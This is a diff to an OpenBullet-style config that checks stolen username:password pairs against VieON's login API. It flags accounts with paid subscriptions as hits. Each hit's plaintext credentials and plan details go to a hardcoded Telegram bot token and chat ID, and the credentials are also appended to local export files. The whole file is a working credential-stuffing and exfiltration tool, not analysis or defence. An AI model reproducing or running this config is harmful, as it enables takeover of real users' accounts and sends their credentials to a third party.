@@ -1,72 +1,94 @@
-HttpRequest xNet POST $"https://api.vieon.vn/backend/user/login/mobile?platform=web&ui=" 
-  CONTENT $"phone_number=<USER>&password=<PASS>&device_id=7199174a4d031580905c47f6e0172f7f&platform=web&model=Windows%2010&push_token=&ui=012021" 
+RandomString $"?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" $"" -> VAR "device_id" 
+
+HttpRequest xNet POST $"https://api.vieon.vn/backend/user/login/anonymous?platform=web&ui=012021" 
+  CONTENT $"device_id=<device_id>&model=Windows%2010&platform=web&ui=012021" 
   CONTENTTYPE "application/x-www-form-urlencoded" 
-  HEADER $"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36" 
+  HEADER $"Accept: application/json, text/plain, */*" 
+  HEADER $"Origin: https://vieon.vn" 
+  HEADER $"Referer: https://vieon.vn/" 
+  HEADER $"Sec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"" 
+  HEADER $"Sec-Ch-Ua-Mobile: ?0" 
+  HEADER $"Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER $"Sec-Fetch-Dest: empty" 
+  HEADER $"Sec-Fetch-Mode: cors" 
+  HEADER $"Sec-Fetch-Site: same-site" 
+  HEADER $"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" 
+
+Parse $"<SOURCE>" JSON $"access_token" -> VAR "access_token" 
+
+HttpRequest xNet POST $"https://api.vieon.vn/backend/user/v2/register?platform=web&ui=012021" 
+  CONTENT $"{\"username\":\"<USER>\",\"country_code\":\"VN\",\"model\":\"Windows 10\",\"device_id\":\"<device_id>\",\"device_name\":\"Chrome/120\",\"device_type\":\"desktop\",\"platform\":\"web\",\"ui\":\"012021\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER $"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" 
   HEADER $"Pragma: no-cache" 
-  HEADER $"Accept: */*" 
-  HEADER $"origin: https://vieon.vn" 
-  HEADER $"referer: https://vieon.vn/" 
-  HEADER $"sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"" 
-  HEADER $"sec-ch-ua-mobile: ?0" 
-  HEADER $"sec-fetch-dest: empty" 
-  HEADER $"sec-fetch-mode: cors" 
-  HEADER $"sec-fetch-site: same-site" 
+  HEADER $"Accept: application/json, text/plain, */*" 
+  HEADER $"Authorization: <access_token>" 
+  HEADER $"Origin: https://vieon.vn" 
+  HEADER $"Sec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"" 
+  HEADER $"Sec-Ch-Ua-Mobile: ?0" 
+  HEADER $"Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER $"Sec-Fetch-Dest: empty" 
+  HEADER $"Sec-Fetch-Mode: cors" 
+  HEADER $"Sec-Fetch-Site: same-site" 
 
-KeyCheck 
+KeyCheck BanOnToCheck=False 
   KEYCHAIN Failure OR 
-    KEY $"\":\"Số điện thoại hoặc mật khẩu chưa đúng\"}" 
-    KEY $"\"Tài khoản không tồn tại\"}" 
-  KEYCHAIN Success OR 
-    KEY $"\"is_first_login\":" 
-    KEY $"\"status\":1" 
-  KEYCHAIN Custom "FREE" OR 
-    KEY $"is_premium\":0" 
+    KEY "<SOURCE>" DoesNotContain $"4009" 
 
-Parse $"<SOURCE>" LR $"{\"access_token\":\"" $"\"," CreateEmpty=False -> VAR "token" 
+HttpRequest xNet POST $"https://api.vieon.vn/backend/user/v2/login?platform=web&ui=012021" 
+  CONTENT $"{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"country_code\":\"VN\",\"model\":\"Windows 10\",\"device_id\":\"<device_id>\",\"device_name\":\"Chrome/120\",\"device_type\":\"desktop\",\"platform\":\"web\",\"ui\":\"012021\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER $"Accept: application/json, text/plain, */*" 
+  HEADER $"Authorization: <access_token>" 
+  HEADER $"Origin: https://vieon.vn" 
+  HEADER $"Sec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"" 
+  HEADER $"Sec-Ch-Ua-Mobile: ?0" 
+  HEADER $"Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER $"Sec-Fetch-Dest: empty" 
+  HEADER $"Sec-Fetch-Mode: cors" 
+  HEADER $"Sec-Fetch-Site: same-site" 
+  HEADER $"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" 
 
-#info HttpRequest xNet GET $"https://api.vieon.vn/backend/billing/transaction-success?limit=30&platform=web&ui=" 
+KeyCheck BanOnToCheck=False 
+  KEYCHAIN Failure OR 
+    KEY $"\"code\":400" 
+
+Parse $"<SOURCE>" JSON $"access_token" -> VAR "access_token" 
+
+HttpRequest xNet GET $"https://api.vieon.vn/backend/billing/purchased-services?platform=web&ui=012021" 
   
-  HEADER $": scheme: https" 
-  HEADER $"accept: application/json, text/plain, */*" 
-  HEADER $"accept-encoding: gzip, deflate, br" 
-  HEADER $"accept-language: en-US,en;q=0.9,vi;q=0.8" 
-  HEADER $"authorization: <token>" 
-  HEADER $"sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"" 
-  HEADER $"sec-ch-ua-mobile: ?0" 
-  HEADER $"sec-fetch-dest: empty" 
-  HEADER $"sec-fetch-mode: cors" 
-  HEADER $"sec-fetch-site: same-site" 
-  HEADER $"user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36" 
+  HEADER $"Accept: application/json, text/plain, */*" 
+  HEADER $"Authorization: <access_token>" 
+  HEADER $"Origin: https://vieon.vn" 
+  HEADER $"Referer: https://vieon.vn/ca-nhan/" 
+  HEADER $"Sec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"" 
+  HEADER $"Sec-Ch-Ua-Mobile: ?0" 
+  HEADER $"Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER $"Sec-Fetch-Dest: empty" 
+  HEADER $"Sec-Fetch-Mode: cors" 
+  HEADER $"Sec-Fetch-Site: same-site" 
+  HEADER $"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" 
 
-#tên_ Parse $"<SOURCE>" LR $"\"name\":\"" $"\"," -> CAP "gói" 
+Parse $"<SOURCE>" LR $"\"subscription_use\":" $",\"subscription_remain\"" CreateEmpty=False -> CAP "Gói đang dùng" 
   SAFE 
 
-#expires Parse $"<SOURCE>" LR $"\"expired_date\":\"" $" " CreateEmpty=False -> VAR "expires" 
+Parse $"<SOURCE>" LR $"\"subscription_remain\":" $",\"subscription_expired" CreateEmpty=False -> CAP "Gói còn lại" 
+  SAFE 
 
-DateToUnixTime $"<expires>" $"yyyy-MM-dd" -> VAR "DU" 
-
-CurrentUnixTime -> VAR "CU" 
-
-Compute $"((<DU>-<CU>)/86400)" -> VAR "time_out" 
-
-RoundToInt $"<time_out>" -> CAP "số ngày bay lắc" 
-
-KeyCheck 
-  KEYCHAIN Custom "FREE" OR 
-    KEY $"{\"items\":[],\"" 
+KeyCheck BanOnToCheck=False 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<Gói đang dùng>" Contains $"\"total\":0" 
+    KEY "<Gói còn lại>" Contains $"\"total\":0" 
   KEYCHAIN Success OR 
-    KEY $"VIP" 
-    KEY $"All" 
-    KEY $"Gói" 
-  KEYCHAIN Custom "FREE" OR 
-    KEY "<time_out>" Contains $"-" 
+    KEY "<Gói đang dùng>" DoesNotContain $"\"total\":0" 
+    KEY "<Gói còn lại>" DoesNotContain $"\"total\":0" 
 
 #Auto_Hit_telegram TlgSendMessage $"6690631010:AAHC5RDOtXmS5riiQUey5rpofmvyqlpUxQY" $"1407009078" 
-  MESSAGE $"<USER>:<PASS> | Gói = <gói> | Date = <expires>" -> VAR "Auto Hit" 
+  MESSAGE $"<USER>:<PASS> | Gói = <Gói đang dùng> | Date = <Gói còn lại>" -> VAR "Auto Hit" 
 
 #Export_List_sdt FileAppendLines $"Vieon_list_sdt.txt" 
   CONTENT $"<USER>:<PASS>" 
 
 #Export_list_data FileAppendLines $"Export_List_data.txt" 
-  CONTENT $"<USER>:<PASS> | Gói = <gói> | Date = <expires>" 
+  CONTENT $"<USER>:<PASS> | Gói = <Gói đang dùng> | Date = <Gói còn lại>" 
 
